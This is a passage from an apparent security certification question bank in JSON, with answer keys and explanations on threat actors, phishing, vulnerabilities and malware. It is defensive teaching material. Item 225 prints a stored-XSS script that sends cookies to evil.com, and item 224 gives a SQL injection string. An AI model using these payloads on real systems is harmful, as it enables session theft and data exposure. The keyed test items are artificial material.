  "exp": "Threat intelligence types: Strategic (high-level, long-term — informs executives and investment decisions), Operational (specific active campaigns or operations — informs IR and threat hunting), Tactical (TTPs — techniques, tactics, procedures — informs control design and defensive improvement), Technical (specific indicators: IP addresses, domains, file hashes — informs blocking and detection rules). Using MITRE ATT&CK mapped TTPs to assess and improve defensive controls = tactical intelligence. MITRE ATT&CK is specifically a tactical intelligence framework. Strategic would be \"ransomware is growing, we should invest in EDR.\" Technical would be \"here are 50 C2 IP addresses to block.\""
 },
 {
  "id": 208,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A cybersecurity analyst attributes a recent attack on critical infrastructure to a group with virtually unlimited funding, advanced custom malware, and zero-day exploits. The attack appeared designed to disrupt national services rather than generate profit. Which threat actor type MOST likely conducted this attack?",
  "opts": [
   "A. Hacktivist",
   "B. Insider threat",
   "C. Nation-state",
   "D. Organized crime"
  ],
  "correct": 2,
  "exp": "Nation-state actors have virtually unlimited resources (government funding), access to advanced tools including zero-day exploits and custom malware, and their motivation is often geopolitical — disrupting another nation's infrastructure, espionage, or sabotage. Hacktivists (A) are ideologically motivated but typically lack the sophistication and resources for zero-day exploitation of critical infrastructure. Insider threats (B) originate from within the organization. Organized crime (D) is financially motivated — they seek profit through ransomware, fraud, or data theft, not infrastructure disruption for political goals."
 },
 {
  "id": 209,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A company discovers that employees in the marketing department have been using an unapproved cloud-based file sharing service to collaborate with external contractors. IT and security teams were unaware of this service. What does this scenario describe?",
  "opts": [
   "A. Insider threat",
   "B. Shadow IT",
   "C. Supply chain attack",
   "D. Social engineering"
  ],
  "correct": 1,
  "exp": "Shadow IT refers to the use of IT systems, devices, software, applications, and services without explicit IT department approval or knowledge. Employees using unauthorized cloud services to accomplish business tasks is a classic shadow IT scenario. It introduces risk because IT cannot monitor, patch, or secure unknown services. Insider threat (A) implies malicious intent — this is unauthorized but not necessarily malicious. Supply chain attack (C) targets the organization through a third-party vendor or supplier. Social engineering (D) involves manipulating people into divulging information or performing actions. Shadow IT is often driven by convenience, not malice."
 },
 {
  "id": 210,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker gains access to a software vendor's build environment and injects malicious code into a legitimate software update. Thousands of customers install the compromised update. Which threat vector does this attack use?",
  "opts": [
   "A. Removable media",
   "B. Unsecure network",
   "C. Supply chain",
   "D. Default credentials"
  ],
  "correct": 2,
  "exp": "A supply chain attack targets the organization through a trusted third-party vendor, supplier, or service provider. By compromising the vendor's build environment and injecting malicious code into a legitimate update (as in the SolarWinds Orion attack), the attacker reaches thousands of downstream victims who trust the vendor's software. Removable media (A) involves USB drives or other physical media. Unsecure network (B) involves unprotected communications. Default credentials (D) involve unchanged factory passwords. Supply chain attacks are especially dangerous because they exploit established trust relationships."
 },
 {
  "id": 211,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A threat intelligence report identifies a group that breaches companies to steal financial data and sell it on dark web marketplaces. The group uses sophisticated techniques but is motivated purely by monetary gain. Which threat actor type is this?",
  "opts": [
   "A. Nation-state",
   "B. Hacktivist",
   "C. Script kiddie",
   "D. Organized crime"
  ],
  "correct": 3,
  "exp": "Organized crime groups are financially motivated threat actors who use sophisticated techniques to generate profit through cybercrime — stealing and selling data, deploying ransomware, committing fraud. Nation-state actors (A) are geopolitically motivated (espionage, disruption). Hacktivists (B) are ideologically motivated (political or social causes). Script kiddies (C) lack sophistication and typically use pre-built tools for notoriety or amusement. The key indicator here is: sophisticated techniques + purely financial motivation = organized crime."
 },
 {
  "id": 212,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security team discovers that a production server is running Windows Server 2012, which reached end-of-life and no longer receives security patches. Which threat vector does this represent?",
  "opts": [
   "A. Open service ports",
   "B. Unsupported systems",
   "C. Default credentials",
   "D. Vulnerable software"
  ],
  "correct": 1,
  "exp": "Unsupported systems are operating systems or applications that have reached end-of-life (EOL) and no longer receive vendor security updates or patches. Windows Server 2012 EOL means any new vulnerabilities discovered will never be patched by Microsoft, creating a permanently growing attack surface. Open service ports (A) are network ports accepting connections. Default credentials (C) are unchanged factory passwords. Vulnerable software (D) is software with known vulnerabilities that patches exist for but haven't been applied. The key distinction with unsupported systems is that NO patches will ever be available — the vulnerability is permanent without additional compensating controls."
 },
 {
  "id": 213,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker sends a phishing email with an attached Word document containing a malicious macro. When the recipient opens the document and enables macros, malware is installed. Which threat vector is being used?",
  "opts": [
   "A. Image-based attack",
   "B. File-based attack",
   "C. Voice-based attack (vishing)",
   "D. SMS-based attack (smishing)"
  ],
  "correct": 1,
  "exp": "A file-based attack uses a malicious file (document, PDF, spreadsheet, executable) as the delivery mechanism for malware. Malicious macros embedded in Office documents are a classic file-based threat vector — they execute code when the user enables macros. Image-based attacks (A) embed malicious code within image files or use images to convey phishing content (e.g., screenshots of text to evade email scanners). Voice-based attacks (C) use phone calls to manipulate victims. SMS-based attacks (D) use text messages. The document with malicious macros is a file-based threat vector delivered via email."
 },
 {
  "id": 214,
  "type": "mcq",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A network scan reveals that several IoT devices on the corporate network are accessible using the manufacturer's published default username and password. These credentials were never changed after deployment. Which threat vector is this?",
  "opts": [
   "A. Unsupported systems",
   "B. Open service ports",
   "C. Default credentials",
   "D. Supply chain compromise"
  ],
  "correct": 2,
  "exp": "Default credentials are factory-set usernames and passwords that ship with devices and are publicly documented. When administrators fail to change them, attackers can easily access devices using well-known credential lists. IoT devices are especially vulnerable because they are often deployed without changing defaults. Unsupported systems (A) have reached end-of-life. Open service ports (B) are unnecessary listening services. Supply chain compromise (D) involves tampering during manufacturing or distribution. Default credentials are one of the most common and easily exploitable threat vectors — always change them during initial configuration."
 },
 {
  "id": 215,
  "type": "multi",
  "domain": 2,
  "obj": "2.1",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A company is assessing threat vectors that could be used against its infrastructure. Which TWO of the following are examples of threat vectors related to network-based attacks?",
  "opts": [
   "A. An employee plugging in an infected USB drive",
   "B. An externally accessible database server with port 3306 (MySQL) exposed to the internet",
   "C. A phishing email with a malicious PDF attachment",
   "D. An unsecured wireless access point using no encryption",
   "E. A disgruntled employee stealing printed documents"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Network-based threat vectors include: (B) Open service ports — exposing MySQL (3306) to the internet allows attackers to directly attempt connections, brute-force credentials, or exploit database vulnerabilities remotely. (D) Unsecure networks — an unencrypted wireless access point allows anyone in range to intercept traffic, perform man-in-the-middle attacks, or gain unauthorized network access. An infected USB drive (A) is a removable media vector. A phishing email with a malicious PDF (C) is a combination of email and file-based vectors. Stealing printed documents (E) is a physical security issue, not network-based."
 },
 {
  "id": 216,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A CEO receives an email that appears to come from the company's legal counsel, urgently requesting a wire transfer to settle a confidential acquisition. The email uses the exact writing style and signature block of the real attorney. The \"Reply-To\" address subtly differs by one character. What type of social engineering attack is this?",
  "opts": [
   "A. Smishing",
   "B. Whaling",
   "C. Vishing",
   "D. Watering hole"
  ],
  "correct": 1,
  "exp": "Whaling is a highly targeted phishing attack directed at senior executives (the \"big fish\"). It uses personalized, convincing content (legal language, accurate formatting, impersonation of trusted contacts) to manipulate high-value targets into actions like wire transfers. Smishing (A) uses SMS text messages. Vishing (C) uses voice calls. Watering hole (D) compromises websites the target frequently visits. The key indicators: targeting the CEO specifically, impersonating a trusted advisor, urgency, financial request, and subtle email address spoofing — this is textbook whaling, which is a subset of spear phishing."
 },
 {
  "id": 217,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker researches a company's IT department, identifies the help desk manager by name, and calls an employee pretending to be that manager. The attacker says there's an urgent system issue and asks the employee to share their login credentials over the phone. What type of attack is this?",
  "opts": [
   "A. Spear phishing",
   "B. Vishing",
   "C. Smishing",
   "D. Typosquatting"
  ],
  "correct": 1,
  "exp": "Vishing (voice phishing) is a social engineering attack conducted over the phone. The attacker impersonates a trusted individual and uses urgency to manipulate the victim into divulging sensitive information. Spear phishing (A) is a targeted email-based attack. Smishing (C) uses SMS text messages. Typosquatting (D) registers domains with common misspellings of legitimate sites. The defining characteristic of vishing is the voice communication channel — the attack is conducted via phone call, using pretexting (creating a fabricated scenario) to build credibility."
 },
 {
  "id": 218,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker discovers that employees of a targeted defense contractor frequently visit a specific industry news website. The attacker compromises that website and embeds a drive-by download exploit. When employees visit the site, their browsers are silently compromised. What type of attack is this?",
  "opts": [
   "A. Phishing",
   "B. Brand impersonation",
   "C. Watering hole",
   "D. Business email compromise"
  ],
  "correct": 2,
  "exp": "A watering hole attack compromises a website that the target group is known to visit — like a predator waiting at a watering hole where prey must come to drink. Instead of phishing the targets directly, the attacker lies in wait on a trusted site. Phishing (A) sends deceptive messages directly to victims. Brand impersonation (B) creates fake websites or communications mimicking a known brand. Business email compromise (D) takes over or spoofs business email accounts for fraud. Watering hole attacks are effective because they exploit the implicit trust users place in their regularly visited websites."
 },
 {
  "id": 219,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker registers the domain \"arnazon.com\" (using \"rn\" to look like \"m\") and creates a convincing replica of a legitimate shopping site. Users who mistype the URL or click links in phishing emails arrive at the fake site and enter their credentials. What technique is this?",
  "opts": [
   "A. Watering hole attack",
   "B. Pretexting",
   "C. Typosquatting",
   "D. Smishing"
  ],
  "correct": 2,
  "exp": "Typosquatting (URL hijacking) involves registering domains that are misspellings or visual look-alikes of legitimate domains. \"arnazon.com\" visually resembles \"amazon.com\" because \"rn\" looks like \"m\" in many fonts. Users who mistype URLs or don't carefully inspect links land on the malicious site. Watering hole (A) compromises a legitimate site the target visits. Pretexting (B) creates a fabricated scenario to manipulate victims. Smishing (D) uses SMS for social engineering. Typosquatting exploits both human typing errors and visual similarity — it is closely related to brand impersonation and is often combined with phishing campaigns."
 },
 {
  "id": 220,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker compromises a vendor's email account and monitors email conversations with the target company for weeks. When a legitimate invoice is due, the attacker sends an email from the real vendor's account with modified payment details directing funds to the attacker's bank account. What type of attack is this?",
  "opts": [
   "A. Spear phishing",
   "B. Business email compromise (BEC)",
   "C. Whaling",
   "D. Pretexting"
  ],
  "correct": 1,
  "exp": "Business email compromise (BEC) involves taking over or spoofing a legitimate business email account to conduct fraud. In this scenario, the attacker compromised the actual vendor's email, monitored real conversations, and then used that access to modify invoice payment details — a classic BEC attack. Spear phishing (A) sends targeted phishing emails but doesn't require compromising an actual email account. Whaling (C) targets senior executives specifically. Pretexting (D) creates a fabricated scenario. BEC is particularly dangerous because it uses a real, compromised email account, making it extremely difficult for victims to detect."
 },
 {
  "id": 221,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A nation-state threat actor creates thousands of fake social media accounts that spread false information about a competitor nation's pandemic response, including fabricated statistics and fake expert quotes. The goal is to erode public trust in the target nation's government. This campaign is an example of:",
  "opts": [
   "A. Misinformation — the spreaders do not know the information is false",
   "B. Disinformation — the false information is deliberately created and spread to cause harm",
   "C. Pretexting — the attacker creates a false identity to gather intelligence",
   "D. Brand impersonation — the attacker impersonates a trusted organization"
  ],
  "correct": 1,
  "exp": "Disinformation is the deliberate creation and dissemination of false information with the intent to deceive, manipulate, or cause harm. The nation-state actor knowingly fabricates statistics and quotes and systematically spreads them. Misinformation (A) is false information spread without malicious intent — the spreader genuinely believes it is true. Pretexting (C) involves creating a fabricated scenario for social engineering, typically in interpersonal interactions. Brand impersonation (D) mimics a specific trusted organization. The key distinction: disinformation = intentional deception; misinformation = unintentional spreading of false information."
 },
 {
  "id": 222,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An employee receives a text message on their personal phone that appears to be from their bank, stating their account has been locked and providing a link to \"verify\" their identity. The link leads to a credential-harvesting site. What type of social engineering attack is this?",
  "opts": [
   "A. Vishing",
   "B. Phishing",
   "C. Smishing",
   "D. Spear phishing"
  ],
  "correct": 2,
  "exp": "Smishing (SMS phishing) is a social engineering attack delivered via text message (SMS). The attacker sends a deceptive text that impersonates a trusted entity and includes a malicious link. Vishing (A) uses voice calls. Standard phishing (B) uses email. Spear phishing (D) is a targeted email attack aimed at a specific individual. The delivery channel is the key differentiator: email = phishing, phone call = vishing, text message = smishing. All three use the same psychological manipulation techniques but through different communication channels."
 },
 {
  "id": 223,
  "type": "mcq",
  "domain": 2,
  "obj": "2.2",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An attacker calls the IT help desk and claims to be a senior VP who is traveling and urgently needs a password reset. The attacker provides the VP's employee ID (obtained from social media) and exhibits aggressive behavior when questioned about verification. The help desk resets the password. This attack is BEST described as:",
  "opts": [
   "A. Tailgating",
   "B. Pretexting",
   "C. Watering hole",
   "D. Typosquatting"
  ],
  "correct": 1,
  "exp": "Pretexting involves creating a fabricated scenario (pretext) to manipulate a victim into performing an action or divulging information. The attacker constructed a detailed story — impersonating a senior VP, providing a real employee ID, creating urgency, and using authority and intimidation. Tailgating (A) is physically following an authorized person through a secured door. Watering hole (C) compromises a frequently visited website. Typosquatting (D) uses look-alike domain names. Pretexting is often combined with vishing (this attack was conducted via phone) and relies on building false credibility through research and social manipulation."
 },
 {
  "id": 224,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security analyst reviewing web application logs notices the following input in a login form field: <code>' OR 1=1 --</code>. The application returned all user records from the database. Which vulnerability was exploited?",
  "opts": [
   "A. Cross-site scripting (XSS)",
   "B. Buffer overflow",
   "C. SQL injection",
   "D. Cross-site request forgery (CSRF)"
  ],
  "correct": 2,
  "exp": "SQL injection occurs when an attacker inserts malicious SQL code into application input fields that are incorporated directly into database queries without proper sanitization. The input ' OR 1=1 -- modifies the SQL query: the single quote closes the original string, OR 1=1 makes the condition always true (returning all records), and -- comments out the rest of the query. XSS (A) injects client-side scripts into web pages viewed by other users. Buffer overflow (B) writes beyond allocated memory boundaries. CSRF (D) tricks users into performing unintended actions on sites where they are authenticated. SQL injection is prevented by parameterized queries (prepared statements) and input validation."
 },
 {
  "id": 225,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A penetration tester discovers that a web application displays user-submitted forum posts without sanitizing HTML or JavaScript. The tester submits a post containing <code>&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. When other users view the post, their session cookies are sent to the attacker's server. Which vulnerability is this?",
  "opts": [
   "A. SQL injection",
   "B. Stored cross-site scripting (XSS)",
   "C. Cross-site request forgery (CSRF)",
   "D. Server-side request forgery (SSRF)"
  ],
  "correct": 1,
  "exp": "Stored (persistent) XSS occurs when malicious scripts are permanently stored on the target server (in a database, forum post, comment) and executed in other users' browsers when they view the content. The script runs in the context of the vulnerable site, allowing cookie theft, session hijacking, and account takeover. SQL injection (A) targets the database through query manipulation. CSRF (C) forces authenticated users to perform unintended actions via forged requests. SSRF (D) tricks the server into making requests to unintended destinations. XSS prevention: input validation, output encoding, Content Security Policy (CSP) headers, and HttpOnly cookie flags."
 },
 {
  "id": 226,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A developer writes a C program that copies user input into a fixed-size array of 64 bytes without checking the input length. An attacker submits 256 bytes of carefully crafted input, overwriting the function's return address on the stack and redirecting execution to malicious shellcode. Which vulnerability was exploited?",
  "opts": [
   "A. Race condition",
   "B. SQL injection",
   "C. Buffer overflow",
   "D. Memory leak"
  ],
  "correct": 2,
  "exp": "A buffer overflow occurs when a program writes data beyond the allocated memory buffer boundary. In this case, the 64-byte array is overflowed with 256 bytes, overwriting adjacent memory including the return address on the stack. By controlling the return address, the attacker redirects program execution to their shellcode. Race condition (A) exploits timing dependencies between concurrent operations. SQL injection (B) targets database queries. Memory leak (D) is when allocated memory is not properly freed, causing resource exhaustion. Buffer overflow prevention: bounds checking, safe string functions, ASLR (Address Space Layout Randomization), DEP (Data Execution Prevention), and stack canaries."
 },
 {
  "id": 227,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user is logged into their banking application. They visit a malicious website that contains a hidden form that automatically submits a fund transfer request to the banking application using the user's active session. The bank processes the transfer because the user is authenticated. Which vulnerability does this exploit?",
  "opts": [
   "A. Cross-site scripting (XSS)",
   "B. Cross-site request forgery (CSRF)",
   "C. SQL injection",
   "D. Session fixation"
  ],
  "correct": 1,
  "exp": "Cross-site request forgery (CSRF) tricks a user's browser into making unintended requests to a site where the user is already authenticated. The browser automatically includes the user's session cookies with the forged request, making it appear legitimate to the server. XSS (A) injects scripts that execute in other users' browsers. SQL injection (C) manipulates database queries. Session fixation (D) forces a user to use an attacker-chosen session ID. CSRF prevention: anti-CSRF tokens (unique tokens per form/request), SameSite cookie attribute, requiring re-authentication for sensitive actions, and checking the Referer/Origin headers."
 },
 {
  "id": 228,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security researcher discovers a vulnerability in a widely used operating system that has never been publicly disclosed and for which no patch exists. The vendor is unaware of the flaw. What type of vulnerability is this?",
  "opts": [
   "A. Known vulnerability with available patch",
   "B. Zero-day vulnerability",
   "C. Legacy system vulnerability",
   "D. Misconfiguration vulnerability"
  ],
  "correct": 1,
  "exp": "A zero-day vulnerability is a flaw that is unknown to the vendor and the public, meaning zero days have passed since the vendor became aware. No patch or mitigation is available because the vendor doesn't know about it. Zero-days are extremely valuable to attackers (and on the exploit market) because there is no defense against them until discovered and patched. Known vulnerabilities (A) have been publicly disclosed and typically have patches. Legacy vulnerabilities (C) exist in old, possibly unsupported systems. Misconfiguration (D) is an error in setup, not a software flaw. Zero-days are the highest-risk vulnerabilities because defenders are blind to them."
 },
 {
  "id": 229,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "Two threads in a banking application check an account balance and process a withdrawal simultaneously. Thread A checks the balance ($1,000) and confirms the withdrawal ($800) is valid. Before Thread A deducts the money, Thread B also checks the balance ($1,000) and approves a second $800 withdrawal. Both withdrawals process, resulting in a -$600 balance. Which vulnerability is this?",
  "opts": [
   "A. Buffer overflow",
   "B. Memory injection",
   "C. Race condition",
   "D. Integer overflow"
  ],
  "correct": 2,
  "exp": "A race condition (specifically a TOCTOU — Time of Check to Time of Use — vulnerability) occurs when the outcome depends on the timing of concurrent operations. Both threads checked the balance before either modified it, creating a window where the state was inconsistent. This is a classic race condition in financial applications. Buffer overflow (A) writes beyond allocated memory. Memory injection (B) injects code into running process memory. Integer overflow (D) occurs when a calculation exceeds the maximum value an integer type can hold. Race conditions are prevented by implementing proper locking mechanisms (mutexes), atomic transactions, and serialization of critical operations."
 },
 {
  "id": 230,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A penetration tester discovers that a network device is still using the manufacturer's published default administrator password of \"admin/admin.\" Which vulnerability category does this fall under?",
  "opts": [
   "A. Zero-day vulnerability",
   "B. Cryptographic vulnerability",
   "C. Misconfiguration",
   "D. Hardware vulnerability"
  ],
  "correct": 2,
  "exp": "Using default credentials is a misconfiguration — the device was deployed without following security hardening procedures. Default passwords are publicly documented and easily found by attackers. This is not a zero-day (A) because the vendor didn't create a flaw — the administrator failed to change the password. It is not a cryptographic vulnerability (B) because the authentication mechanism itself may work correctly. It is not a hardware vulnerability (D) because the hardware is not flawed. Misconfiguration is one of the most common and easily exploitable vulnerability categories, encompassing default credentials, unnecessary services, overly permissive access controls, and improper security settings."
 },
 {
  "id": 231,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An employee downloads an application from an unofficial third-party app store onto their corporate mobile device, bypassing the company's mobile device management (MDM) approved app catalog. This practice is known as:",
  "opts": [
   "A. Jailbreaking",
   "B. Rooting",
   "C. Sideloading",
   "D. Sandboxing"
  ],
  "correct": 2,
  "exp": "Sideloading is the practice of installing applications from sources other than the official app store (Google Play, Apple App Store) or the organization's approved MDM catalog. This bypasses the security vetting and review that official stores provide. Jailbreaking (A) removes software restrictions on iOS devices to allow unauthorized modifications. Rooting (B) is the Android equivalent of jailbreaking — gaining root/superuser access. Sandboxing (D) isolates applications in a restricted environment. Sideloading introduces risk because the app has not been vetted for malware, data collection practices, or security vulnerabilities by the official store's review process."
 },
 {
  "id": 232,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user removes the manufacturer's software restrictions on their iPhone to install unauthorized applications and tweaks from third-party repositories. This practice, which voids the warranty and weakens the device's security model, is called:",
  "opts": [
   "A. Sideloading",
   "B. Jailbreaking",
   "C. Containerization",
   "D. Rooting"
  ],
  "correct": 1,
  "exp": "Jailbreaking is the process of removing software restrictions imposed by Apple on iOS devices. It allows users to gain root access and install unauthorized applications, but it disables critical security features (code signing enforcement, sandboxing, update mechanisms) and voids the warranty. Sideloading (A) is installing apps outside the official store without modifying the OS itself. Containerization (C) separates personal and corporate data on a device. Rooting (D) is the equivalent process on Android devices. Jailbreaking fundamentally compromises the iOS security model and makes the device significantly more vulnerable to malware and exploitation."
 },
 {
  "id": 233,
  "type": "multi",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice · Select TWO",
  "badgeClass": "multi-b",
  "stem": "A security architect is reviewing application vulnerabilities. Which TWO of the following are web application vulnerabilities that involve injecting malicious content?",
  "opts": [
   "A. Buffer overflow in a C++ application",
   "B. Stored cross-site scripting (XSS) through user forum posts",
   "C. Bluetooth impersonation attack (BIAS)",
   "D. SQL injection through unsanitized form input",
   "E. Hard-coded credentials in firmware"
  ],
  "correct": [
   1,
   3
  ],
  "exp": "Web application injection vulnerabilities include: (B) Stored XSS — injecting malicious JavaScript through user input that is stored on the server and executed in other users' browsers. (D) SQL injection — injecting malicious SQL through unsanitized input that is executed by the database. Buffer overflow (A) is a memory corruption vulnerability in compiled applications, not web-specific injection. Bluetooth BIAS (C) is a hardware/protocol vulnerability, not a web application issue. Hard-coded credentials (E) are a firmware/software development flaw, not an injection vulnerability. Both XSS and SQLi are prevented by proper input validation and output encoding."
 },
 {
  "id": 234,
  "type": "mcq",
  "domain": 2,
  "obj": "2.3",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A security assessment reveals that a company's web server is using SSL 3.0 for HTTPS connections. The assessor flags this as a significant vulnerability. Why is SSL 3.0 considered a cryptographic vulnerability?",
  "opts": [
   "A. SSL 3.0 uses excessively long key lengths that slow performance",
   "B. SSL 3.0 has known vulnerabilities (such as POODLE) and is considered cryptographically broken",
   "C. SSL 3.0 does not support any encryption algorithms",
   "D. SSL 3.0 is too new and has not been sufficiently tested"
  ],
  "correct": 1,
  "exp": "SSL 3.0 is a cryptographic vulnerability because it has known exploitable weaknesses, most notably the POODLE (Padding Oracle On Downgraded Legacy Encryption) attack. SSL 3.0 was deprecated in 2015 (RFC 7568). It should be replaced with TLS 1.2 or TLS 1.3. SSL 3.0 does not use long keys (A) — its weakness is in the protocol design, not key length. It does support encryption (C) — it is just insecure. It is decades old, not new (D). Using deprecated or broken cryptographic protocols is a cryptographic vulnerability — even if encryption is present, if the encryption can be broken, confidentiality is effectively lost."
 },
 {
  "id": 235,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "An employee clicks a link in a phishing email and a pop-up demands a Bitcoin payment to decrypt all files on their workstation. The files have been encrypted with a .locked extension. What type of malware is this?",
  "opts": [
   "A. Spyware",
   "B. Ransomware",
   "C. Trojan",
   "D. Worm"
  ],
  "correct": 1,
  "exp": "Ransomware encrypts the victim's files and demands payment (typically in cryptocurrency) for the decryption key. The .locked extension and Bitcoin payment demand are characteristic ransomware indicators. Spyware (A) secretly monitors user activity and collects data. A Trojan (C) disguises itself as legitimate software. A worm (D) self-replicates across networks without user interaction. Modern ransomware often combines encryption with data exfiltration (double extortion) — threatening to publish stolen data if the ransom is not paid. Prevention: regular backups, email filtering, user training, endpoint detection, and network segmentation."
 },
 {
  "id": 236,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user downloads what appears to be a free PDF reader from a website. The application functions as a legitimate PDF reader but secretly installs a backdoor that allows remote access to the system. What type of malware is this?",
  "opts": [
   "A. Worm",
   "B. Virus",
   "C. Trojan",
   "D. Rootkit"
  ],
  "correct": 2,
  "exp": "A Trojan (Trojan horse) disguises itself as legitimate, useful software to trick users into installing it. It appears to function normally (reading PDFs) while performing malicious actions in the background (installing a backdoor). A worm (A) self-replicates without user interaction. A virus (B) attaches to legitimate programs and requires host file execution to spread. A rootkit (D) hides malware presence by modifying the OS — while the backdoor might later install a rootkit, the initial delivery mechanism (fake PDF reader) is a Trojan. The key characteristic of Trojans: they rely on user deception to achieve installation."
 },
 {
  "id": 237,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "The IT team notices that a single workstation infected with malware has spread the infection to dozens of other systems across the network without any user interaction on those systems. The malware exploits a vulnerability in the Windows SMB service. What type of malware exhibits this behavior?",
  "opts": [
   "A. Virus",
   "B. Trojan",
   "C. Worm",
   "D. Logic bomb"
  ],
  "correct": 2,
  "exp": "A worm is malware that self-replicates and spreads across networks automatically without requiring user interaction or a host file. Exploiting the SMB vulnerability to spread from system to system (similar to WannaCry/EternalBlue) is classic worm behavior. A virus (A) requires a host file and user action to spread. A Trojan (B) requires the user to be tricked into installing it. A logic bomb (D) is dormant code that triggers on a specific condition (date, event). The key distinction: worms are self-propagating across networks without human intervention — they exploit vulnerabilities in network services to spread autonomously."
 },
 {
  "id": 238,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A forensic investigator finds malware on a system that operates entirely in memory using PowerShell and WMI (Windows Management Instrumentation). No malicious files exist on the hard drive. Rebooting the system clears the infection but does not address the entry point. What type of malware is this?",
  "opts": [
   "A. Rootkit",
   "B. Fileless malware",
   "C. Ransomware",
   "D. Bloatware"
  ],
  "correct": 1,
  "exp": "Fileless malware operates entirely in memory without writing traditional files to disk. It leverages legitimate system tools (PowerShell, WMI, .NET framework) — a technique called \"living off the land\" (LOLBins). Because there are no malicious files on disk, traditional signature-based antivirus cannot detect it. Rebooting clears RAM, removing the malware temporarily, but reinfection occurs if the entry vector is not addressed. Rootkits (A) hide malware by modifying OS components — they typically persist on disk. Ransomware (C) encrypts files. Bloatware (D) is unwanted pre-installed software. Fileless malware is detected through behavior analysis, memory scanning, and EDR solutions."
 },
 {
  "id": 239,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A disgruntled system administrator plants code in the payroll application that will delete the entire employee database if they are ever removed from Active Directory. Six months later, the administrator is terminated, their account is disabled, and the code executes, destroying payroll data. What type of malware is this?",
  "opts": [
   "A. Worm",
   "B. Keylogger",
   "C. Rootkit",
   "D. Logic bomb"
  ],
  "correct": 3,
  "exp": "A logic bomb is malicious code that lies dormant until a specific condition or trigger is met. In this case, the trigger was the administrator's Active Directory account being disabled (termination). Logic bombs are particularly associated with insider threats — employees with system access who plant destructive code as insurance or revenge. A worm (A) self-replicates across networks. A keylogger (B) records keystrokes. A rootkit (C) hides malware presence. Logic bomb prevention: code reviews, separation of duties, access controls on production systems, integrity monitoring, and monitoring departing employees' recent system changes."
 },
 {
  "id": 240,
  "type": "mcq",
  "domain": 2,
  "obj": "2.4",
  "badge": "Multiple Choice",
  "badgeClass": "mcq-b",
  "stem": "A user's computer is running unusually slowly. Investigation reveals software that was pre-installed by the laptop manufacturer — including trial antivirus, games, and various utilities that consume system resources. None of this software was requested. What is this type of unwanted software called?",
  "opts": [
   "A. Spyware",
   "B. Ransomware",
   "C. Bloatware",
   "D. Rootkit"
  ],
  "correct": 2,
